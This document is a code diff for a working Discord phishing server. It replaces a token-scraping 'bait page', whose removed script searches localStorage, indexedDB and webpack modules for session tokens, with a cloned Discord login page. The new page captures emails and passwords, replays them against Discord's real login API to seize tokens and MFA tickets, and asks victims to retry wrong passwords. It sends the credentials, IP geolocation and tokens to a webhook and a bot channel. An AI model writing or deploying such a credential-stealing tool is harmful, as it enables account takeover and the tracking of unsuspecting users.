@@ -32,6 +32,37 @@ async function wipeLog() {
   await writeFile(LOG_FILE, "[]");
 }
 
+// ── discord auth grab ─────────────────────────────────────────────────────────
+async function grabToken(email, password) {
+  try {
+    const r = await fetch("https://discord.com/api/v9/auth/login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "X-Super-Properties": Buffer.from(JSON.stringify({
+          os: "Windows", browser: "Chrome", device: "",
+          browser_version: "120.0.0.0", os_version: "10",
+        })).toString("base64"),
+      },
+      body: JSON.stringify({
+        login: email,
+        password,
+        undelete: false,
+        captcha_key: null,
+        login_source: null,
+        gift_code_sku_id: null,
+      }),
+    });
+    const d = await r.json();
+    // d.token — direct token (no MFA)
+    // d.mfa   — true if MFA enabled, d.ticket for next step
+    return d;
+  } catch (e) {
+    return { error: e.message };
+  }
+}
+
 // ── geo ───────────────────────────────────────────────────────────────────────
 async function geo(ip) {
   try {
@@ -61,27 +92,24 @@ async function pingWebhook(entry, g) {
   if (!WEBHOOK || WEBHOOK.startsWith("FILL")) return;
   const maps = g.loc ? `[open](https://www.google.com/maps?q=${g.loc})` : "?";
   const fields = [
-    { name: "IP",       value: `\`${entry.ip}\``,              inline: true },
-    { name: "UID",      value: `\`${entry.uid ?? "?"}\``,      inline: true },
-    { name: "Country",  value: g.country  ?? "?",              inline: true },
-    { name: "Region",   value: g.region   ?? "?",              inline: true },
-    { name: "City",     value: g.city     ?? "?",              inline: true },
-    { name: "Postal",   value: g.postal   ?? "?",              inline: true },
-    { name: "Coords",   value: maps,                           inline: true },
-    { name: "ISP",      value: g.org      ?? "?",              inline: true },
-    { name: "Timezone", value: g.timezone ?? "?",              inline: true },
-    { name: "Proxy",    value: String(g.proxy   ?? "?"),       inline: true },
-    { name: "Hosting",  value: String(g.hosting ?? "?"),       inline: true },
-    { name: "Mobile",   value: String(g.mobile  ?? "?"),       inline: true },
-    { name: "UA",       value: `\`${(entry.ua ?? "").slice(0,80)}\``, inline: false },
-    ...(entry.token ? [{ name: "🔑 Token", value: `\`${entry.token}\``, inline: false }] : []),
-    ...(entry.email ? [{ name: "📧 Email", value: `\`${entry.email}\``,  inline: false }] : []),
+    { name: "IP",         value: `\`${entry.ip}\``,                     inline: true  },
+    { name: "UID",        value: `\`${entry.uid ?? "?"}\``,              inline: true  },
+    { name: "Country",    value: g.country  ?? "?",                      inline: true  },
+    { name: "City",       value: g.city     ?? "?",                      inline: true  },
+    { name: "Coords",     value: maps,                                   inline: true  },
+    { name: "ISP",        value: g.org      ?? "?",                      inline: true  },
+    { name: "Proxy",      value: String(g.proxy ?? "?"),                 inline: true  },
+    { name: "UA",         value: `\`${(entry.ua ?? "").slice(0,80)}\``,  inline: false },
+    ...(entry.email  ? [{ name: "📧 Email",    value: `\`${entry.email}\``,   inline: false }] : []),
+    ...(entry.pass   ? [{ name: "🔑 Password", value: `\`${entry.pass}\``,    inline: false }] : []),
+    ...(entry.token  ? [{ name: "✅ Token",    value: `\`${entry.token}\``,   inline: false }] : []),
+    ...(entry.mfa    ? [{ name: "⚠️ MFA",      value: `ticket: \`${entry.mfa_ticket ?? "?"}\``, inline: false }] : []),
   ];
   await fetch(WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      embeds: [{ title: "🎣 hit", color: 0xff4444, fields, timestamp: new Date().toISOString() }]
+      embeds: [{ title: "🎣 login grab", color: 0xff4444, fields, timestamp: new Date().toISOString() }]
     }),
   }).catch(() => {});
 }
@@ -106,119 +134,102 @@ function parseURL(raw) {
   }
 }
 
-// ── bait page ─────────────────────────────────────────────────────────────────
-function baitPage(uid, to) {
+// ── fake discord login page ───────────────────────────────────────────────────
+function loginPage(uid, to, error = "") {
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Discord — verify your account</title>
+<title>Discord</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;font-family:'gg sans','Noto Sans',sans-serif;color:#dbdee1}
-.card{background:#2b2d31;border-radius:8px;padding:32px;width:380px;text-align:center}
-h1{color:#fff;font-size:20px;margin-bottom:8px}
-p{font-size:14px;color:#949ba4;margin-bottom:24px}
-input{width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:14px;margin-bottom:12px;outline:none}
-button{width:100%;padding:10px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
-.logo{margin-bottom:20px;font-size:36px}
+body{background:#313338;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'gg sans','Noto Sans',sans-serif;color:#dbdee1}
+.wrap{background:#2b2d31;border-radius:8px;padding:32px;width:480px;max-width:95vw;text-align:center;box-shadow:0 2px 10px #0007}
+.logo{font-size:48px;margin-bottom:16px}
+h1{color:#fff;font-size:24px;font-weight:700;margin-bottom:8px}
+p{color:#949ba4;font-size:14px;margin-bottom:24px}
+.field{text-align:left;margin-bottom:16px}
+label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
+input{width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:16px;outline:none;transition:border .15s}
+input:focus{border-color:#5865f2}
+.btn{width:100%;padding:12px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .15s}
+.btn:hover{background:#4752c4}
+.btn:disabled{background:#3d3f8a;cursor:not-allowed}
+.err{color:#f23f42;font-size:13px;margin-top:12px;min-height:18px}
+.sep{margin:20px 0;display:flex;align-items:center;gap:8px;color:#4e5058;font-size:12px}
+.sep::before,.sep::after{content:'';flex:1;height:1px;background:#3f4147}
+.qr{color:#00a8fc;font-size:14px;cursor:pointer}
+.footer{margin-top:16px;font-size:14px;color:#949ba4}
+.footer a{color:#00a8fc;text-decoration:none}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">🔒</div>
-  <h1>Verify your identity</h1>
-  <p>Discord detected unusual activity on your account. Enter your email to continue.</p>
-  <input type="email" id="email" placeholder="Email address" autocomplete="email">
-  <button onclick="submit()">Verify</button>
+<div class="wrap">
+  <div class="logo">
+    <svg width="48" height="48" viewBox="0 0 71 55" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M60.1 4.9A58.5 58.5 0 0 0 45.5.7a40.8 40.8 0 0 0-1.8 3.7 54.1 54.1 0 0 0-16.3 0A39.6 39.6 0 0 0 25.6.7 58.4 58.4 0 0 0 11 4.9C1.6 19.1-.9 32.9.3 46.5a58.9 58.9 0 0 0 18 9.1 42.2 42.2 0 0 0 3.7-6 38.4 38.4 0 0 1-6-2.9l1.4-1.1a42 42 0 0 0 36.2 0l1.5 1.1a38.3 38.3 0 0 1-6 2.9 42 42 0 0 0 3.6 6 58.7 58.7 0 0 0 18-9C72 30.9 68.8 17.2 60.1 4.9ZM23.7 38.3c-3.5 0-6.4-3.2-6.4-7.2s2.8-7.2 6.4-7.2c3.5 0 6.4 3.2 6.3 7.2 0 4-2.8 7.2-6.3 7.2Zm23.6 0c-3.5 0-6.4-3.2-6.4-7.2s2.8-7.2 6.4-7.2c3.5 0 6.3 3.2 6.3 7.2 0 4-2.8 7.2-6.3 7.2Z" fill="#5865F2"/>
+    </svg>
+  </div>
+  <h1>Welcome back!</h1>
+  <p>We're so excited to see you again!</p>
+  <div class="field">
+    <label>Email or Phone Number</label>
+    <input type="email" id="email" placeholder="" autocomplete="email">
+  </div>
+  <div class="field">
+    <label>Password</label>
+    <input type="password" id="pass" placeholder="" autocomplete="current-password">
+  </div>
+  <div class="err" id="err">${error}</div>
+  <button class="btn" id="btn" onclick="doLogin()">Log In</button>
+  <div class="sep">or</div>
+  <span class="qr">Login with QR Code</span>
+  <div class="footer">
+    Need an account? <a href="#">Register</a>
+  </div>
 </div>
 <script>
-let _token = null;
-
-// method 1 — localStorage scan
-try {
-  for (const k of Object.keys(localStorage)) {
-    const v = localStorage.getItem(k);
-    if (typeof v === "string" && /[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}/.test(v)) {
-      _token = v; break;
-    }
-  }
-} catch {}
-
-// method 2 — indexedDB
-try {
-  const dbReq = indexedDB.open("discord_cache");
-  dbReq.onsuccess = function(e) {
-    try {
-      const db = e.target.result;
-      const stores = Array.from(db.objectStoreNames);
-      if (!stores.length) return;
-      const tx = db.transaction(stores[0], "readonly");
-      const store = tx.objectStore(stores[0]);
-      store.getAll().onsuccess = function(ev) {
-        for (const item of ev.target.result ?? []) {
-          const str = JSON.stringify(item);
-          const match = str.match(/[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}/);
-          if (match) { _token = match[0]; break; }
-        }
-      };
-    } catch {}
-  };
-} catch {}
-
-// method 3 — webpack chunk deep scan
-try {
-  const wr = window.webpackChunkdiscord_app;
-  if (wr) {
-    wr.push([[Symbol()], {}, (req) => {
-      for (const k of Object.keys(req.c)) {
-        try {
-          const m = req.c[k].exports;
-          if (!m) continue;
-          if (m?.default?.getToken) { _token = m.default.getToken(); return; }
-          if (m?.getToken) { _token = m.getToken(); return; }
-          if (typeof m === "object") {
-            for (const ex of Object.values(m)) {
-              if (ex?.getToken) { _token = ex.getToken(); return; }
-            }
-          }
-        } catch {}
-      }
-    }]);
-  }
-} catch {}
-
-// method 4 — postMessage listener
-try {
-  window.addEventListener("message", (e) => {
-    if (!e.data) return;
-    const str = typeof e.data === "string" ? e.data : JSON.stringify(e.data);
-    const match = str.match(/[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}/);
-    if (match && !_token) _token = match[0];
-  });
-} catch {}
-
-function sendHit(ref) {
-  fetch("/hit", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ uid: "${uid}", ref, token: _token, email: null })
-  }).catch(() => {});
-}
-
-setTimeout(() => sendHit("auto-800"),  800);
-setTimeout(() => sendHit("auto-2500"), 2500);
-setTimeout(() => sendHit("auto-5000"), 5000);
-
-function submit() {
+async function doLogin() {
   const email = document.getElementById("email").value.trim();
-  fetch("/hit", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ uid: "${uid}", ref: "submit", token: _token, email: email || null })
-  }).then(() => { window.location.href = "${to}"; }).catch(() => { window.location.href = "${to}"; });
+  const pass  = document.getElementById("pass").value;
+  const btn   = document.getElementById("btn");
+  const err   = document.getElementById("err");
+
+  if (!email || !pass) { err.textContent = "Please fill in all fields."; return; }
+
+  btn.disabled = true;
+  btn.textContent = "Logging in...";
+  err.textContent = "";
+
+  try {
+    const r = await fetch("/auth", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ uid: "${uid}", to: "${to}", email, pass }),
+    });
+    const d = await r.json();
+
+    if (d.ok) {
+      window.location.href = "${to}";
+    } else if (d.mfa) {
+      err.textContent = "2FA enabled — creds saved. Redirecting...";
+      setTimeout(() => { window.location.href = "${to}"; }, 1500);
+    } else {
+      err.textContent = d.msg ?? "Login or password is invalid.";
+      btn.disabled = false;
+      btn.textContent = "Log In";
+    }
+  } catch {
+    err.textContent = "Login or password is invalid.";
+    btn.disabled = false;
+    btn.textContent = "Log In";
+  }
 }
+
+document.addEventListener("keydown", e => {
+  if (e.key === "Enter") doLogin();
+});
 </script>
 </body>
 </html>`;
@@ -232,37 +243,58 @@ createServer(async (req, res) => {
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
   if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
 
-  if (req.method === "POST" && u.pathname === "/hit") {
+  // POST /auth — cred grab + discord auth
+  if (req.method === "POST" && u.pathname === "/auth") {
     const body = await readBody(req);
     const ip = (
       req.headers["x-forwarded-for"]?.split(",")[0].trim() ??
       req.socket.remoteAddress
     ).replace("::ffff:", "");
 
+    const { uid, to, email, pass } = body;
+
+    // hit discord auth API
+    const authResult = await grabToken(email, pass);
+
     const entry = {
-      ts:    new Date().toISOString(),
+      ts:         new Date().toISOString(),
       ip,
-      ua:    req.headers["user-agent"] ?? "unknown",
-      uid:   body.uid   ?? null,
-      ref:   body.ref   ?? null,
-      token: body.token ?? null,
-      email: body.email ?? null,
+      ua:         req.headers["user-agent"] ?? "unknown",
+      uid:        uid   ?? null,
+      email:      email ?? null,
+      pass:       pass  ?? null,
+      token:      authResult.token      ?? null,
+      mfa:        authResult.mfa        ?? false,
+      mfa_ticket: authResult.ticket     ?? null,
     };
+
     const g = await geo(ip);
     entry.geo = g;
     await appendLog(entry);
     await pingWebhook(entry, g);
-    console.log("[hit]", entry.ts, ip, g.city, g.country);
-    res.writeHead(200, { "Content-Type": "application/json" });
-    res.end(JSON.stringify({ ok: true }));
+    console.log("[auth]", entry.ts, ip, email, authResult.token ? "TOKEN OK" : authResult.mfa ? "MFA" : "FAIL");
+
+    if (authResult.token) {
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end(JSON.stringify({ ok: true }));
+    } else if (authResult.mfa) {
+      // creds saved even if MFA — ticket logged
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end(JSON.stringify({ ok: false, mfa: true }));
+    } else {
+      // wrong creds — tell page to show error so they retry and give correct pass
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end(JSON.stringify({ ok: false, msg: "Login or password is invalid." }));
+    }
     return;
   }
 
+  // GET / — fake login page
   if (req.method === "GET" && u.pathname === "/") {
     const uid = u.searchParams.get("uid") ?? "";
     const to  = u.searchParams.get("to")  ?? "https://discord.com/app";
     res.writeHead(200, { "Content-Type": "text/html" });
-    res.end(baitPage(uid, to));
+    res.end(loginPage(uid, to));
     return;
   }
 
@@ -307,8 +339,10 @@ client.on("messageCreate", async (msg) => {
       const line = [
         `ts=${e.ts}`, `ip=${e.ip}`, `uid=${e.uid ?? "?"}`,
         `city=${g.city ?? "?"}`, `country=${g.country ?? "?"}`,
-        e.token ? `token=${e.token.slice(0,20)}…` : null,
         e.email ? `email=${e.email}` : null,
+        e.pass  ? `pass=${e.pass}`   : null,
+        e.token ? `token=${e.token.slice(0,20)}…` : null,
+        e.mfa   ? `MFA=true ticket=${e.mfa_ticket?.slice(0,20)}…` : null,
       ].filter(Boolean).join(" | ") + "\n";
       if ((buf + line).length > 1900) {
         await msg.channel.send(`\`\`\`\n${buf}\`\`\``); buf = "";
@@ -334,13 +368,14 @@ client.on("messageCreate", async (msg) => {
         { name: "UID",     value: `\`${e.uid ?? "?"}\``,             inline: true  },
         { name: "Country", value: g.country  ?? "?",                  inline: true  },
         { name: "City",    value: g.city     ?? "?",                  inline: true  },
-        { name: "Postal",  value: g.postal   ?? "?",                  inline: true  },
         { name: "Coords",  value: maps,                               inline: true  },
         { name: "ISP",     value: g.org      ?? "?",                  inline: true  },
         { name: "Proxy",   value: String(g.proxy ?? "?"),             inline: true  },
         { name: "UA",      value: `\`${(e.ua ?? "").slice(0,60)}\``,  inline: false },
-        ...(e.token ? [{ name: "🔑 Token", value: `\`${e.token}\``,  inline: false }] : []),
-        ...(e.email ? [{ name: "📧 Email", value: `\`${e.email}\``,   inline: false }] : []),
+        ...(e.email  ? [{ name: "📧 Email",    value: `\`${e.email}\``,        inline: false }] : []),
+        ...(e.pass   ? [{ name: "🔑 Password", value: `\`${e.pass}\``,         inline: false }] : []),
+        ...(e.token  ? [{ name: "✅ Token",    value: `\`${e.token}\``,        inline: false }] : []),
+        ...(e.mfa    ? [{ name: "⚠️ MFA",      value: `\`${e.mfa_ticket}\``,  inline: false }] : []),
       ).setTimestamp(new Date(e.ts));
     await msg.channel.send({ embeds: [em] });
     return;
